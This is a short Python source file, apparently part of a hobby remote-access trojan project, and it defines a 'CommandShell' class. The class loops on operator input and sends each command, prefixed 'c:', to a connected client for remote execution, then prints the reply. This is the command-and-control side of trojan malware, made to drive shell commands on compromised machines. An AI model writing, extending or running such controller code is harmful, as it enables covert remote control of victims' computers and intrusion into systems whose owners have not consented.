__author__ = 'Jonas'
from trojanshell import TrojanShell
from JTShell.processes import Process
from JTShell.util.message import Message
from JTShell.util.ansi import Colors
from util import trojanrecv
from util import TrojanMessage
import sys


class CommandShell(TrojanShell):

    def __init__(self, supershell):
        super(CommandShell, self).__init__("cmds", supershell)
        if isinstance(supershell, TrojanShell):
            self.prompt = supershell.prompt[:-2] + "|command> "

    def run(self):
        """
        the main method of the shell running the infinite loop, continuesly prompting for a command, then attempting to
        execute the issued command
        :return: (void)
        """
        # opening the infinite loop inside of a try statement, so that the SystemExit Exception can be caught
        try:
            while True:
                # first fetching the user 4input
                print(self.prompt[:-2] + Colors.MAGENTA + self.prompt[-2:] + Colors.WHITE, end="")
                command = input()

                if command == "exit":
                    if self.supershell is None:
                        sys.exit()
                    else:
                        break
                # skipping the whole procedure in case the command prompt is empty
                if command != "" and command != " ":
                    # calling the execute function of the client, and printing it
                    reply = TrojanMessage(self.client.execute_wait("c:" + command).replace("\\r\\n", "\n"))
                    print(reply.message)

        except SystemExit:
            pass